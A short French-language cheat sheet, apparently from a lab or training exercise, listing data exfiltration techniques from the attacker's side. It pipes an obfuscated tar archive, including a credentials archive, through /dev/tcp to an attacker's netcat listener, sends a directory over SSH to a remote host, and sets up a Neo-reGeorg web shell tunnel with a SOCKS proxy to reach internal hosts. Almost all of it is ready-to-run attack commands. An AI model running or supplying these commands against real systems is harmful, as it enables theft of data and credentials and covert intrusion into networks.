## TCP (non - standard)!!

Attaquant
```
nc -lvp 8080 > /tmp/my-file.data
```
<br>

Vitcime
```
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/<IP>/8080
```
<br>

Attaquand
```
dd conv=ascii if=my-file.data |base64 -d > my-file.tar
tar xvf task4-creds.tar
```
<br>
<br>

## SSH

```
tar cf - task5/ | ssh <user>@<remote-IP>"cd /tmp/; tar xpf -"
```
<br>
<br>

## HTTPS

Attaquant
```
git clone https://github.com/L-codes/Neo-reGeorg.git
```

#### Setup du tunnel
```
python3 neoreg.py generate -k <secret> 
```
(ensuite on upload un des fichiers créer par neoreg)

#### Connexion au tunnel

```
python3 neoreg.py -k <secret> -u http://<IP>/path/to/tunnel.php
```

#### Requête

```
curl --socks5 127.0.0.1:1080 http://172.20.0.121
```
